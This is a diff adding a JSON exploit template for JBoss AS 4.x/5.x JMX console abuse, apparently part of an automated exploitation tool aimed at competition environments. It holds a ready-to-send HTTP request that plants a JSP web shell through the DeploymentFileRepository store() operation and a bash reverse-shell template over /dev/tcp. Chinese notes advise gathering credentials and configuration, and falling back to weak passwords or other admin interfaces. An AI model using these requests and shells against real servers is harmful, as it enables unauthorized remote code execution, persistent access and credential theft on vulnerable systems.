@@ -1,0 +1,117 @@
+{
+  "id": "jboss-jmx-console-deployment-rce",
+  "family": "jboss",
+  "product": "JBoss AS",
+  "cve": "N/A",
+  "aliases": [
+    "JBoss JMX console WAR deploy",
+    "DeploymentFileRepository abuse"
+  ],
+  "severity": "high",
+  "tags": [
+    "jboss",
+    "jmx-console",
+    "deployment",
+    "jsp",
+    "rce"
+  ],
+  "applicability": {
+    "versions": [
+      "JBoss 4.x",
+      "JBoss 5.x",
+      "legacy admin console deployments"
+    ],
+    "fingerprints": [
+      "/jmx-console/HtmlAdaptor reachable",
+      "DeploymentFileRepository MBean exposed",
+      "Legacy admin console pages accessible without strong auth"
+    ],
+    "signals": [
+      "inspectMBean page for jboss.admin:service=DeploymentFileRepository loads",
+      "HtmlAdaptor invokeOpByName supports store() on deployment repository",
+      "Server accepts direct GET/POST invocation of MBean methods"
+    ]
+  },
+  "preconditions": [
+    "The JMX console must be accessible.",
+    "DeploymentFileRepository store operation must be invokable.",
+    "The deployment path written by store() must be web-accessible or executable."
+  ],
+  "verification": {
+    "method": "http_get",
+    "requests": [
+      {
+        "path": "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.admin:service=DeploymentFileRepository",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "",
+        "matchers": [
+          "DeploymentFileRepository page content",
+          "store operation visible"
+        ]
+      }
+    ]
+  },
+  "exploitation": {
+    "mode": "file_write",
+    "requests": [
+      {
+        "path": "/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service=DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=shell.war&argType=java.lang.String&arg1=shell&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=%3C%25if(request.getParameter(%22cmd%22)!=null){Runtime.getRuntime().exec(request.getParameter(%22cmd%22));}%25%3E&argType=boolean&arg4=True",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "",
+        "os_hint": "unknown"
+      }
+    ]
+  },
+  "post_exploitation": {
+    "stabilization": [
+      "写出 JSP 后先访问一次确认路径，再记录部署目录、应用上下文和运行用户。",
+      "优先收集 server/default/deploy、conf、datasources 和管理凭据。",
+      "如果已拿到稳定 JSP，不要继续频繁操作 JMX console。"
+    ],
+    "shell_options": [
+      {
+        "type": "jsp_webshell_write",
+        "template": "Invoke store() to write {jsp_name}.jsp under {war_or_context}, then browse /{context}/{jsp_name}.jsp?cmd=id"
+      },
+      {
+        "type": "bash_reverse_shell",
+        "template": "Use the deployed JSP to execute /bin/sh -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
+      }
+    ]
+  },
+  "stability": {
+    "preferred_order": [
+      "先确认 HtmlAdaptor 和 DeploymentFileRepository bean 暴露。",
+      "再投递最小 JSP。",
+      "成功后切换到 JSP 或配置/凭据面，不再依赖 JMX console。"
+    ],
+    "safe_commands": [
+      "id",
+      "whoami",
+      "pwd",
+      "hostname"
+    ],
+    "shell_prerequisites": [
+      "确认写入路径会被自动部署或直接可访问。",
+      "确认控制台没有额外 CSRF/弱鉴权限制。"
+    ],
+    "fallbacks": [
+      "如果 JMX console 不存在，尝试 admin-console、invoker/readonly、弱口令或已部署业务面。",
+      "如果 store 成功但路径不明，结合 deploy 目录、自动部署日志和常见上下文名继续定位。"
+    ]
+  },
+  "detection_notes": [
+    "JMX console 类题目非常适合作为部署 foothold，不应只停留在单次命令执行。",
+    "比赛环境中要优先利用已知部署路径和 JSP，减少对管理接口的重复访问。"
+  ],
+  "references": [
+    "Public JBoss JMX console deployment abuse write-ups",
+    "Community notes on DeploymentFileRepository exploitation"
+  ]
+}
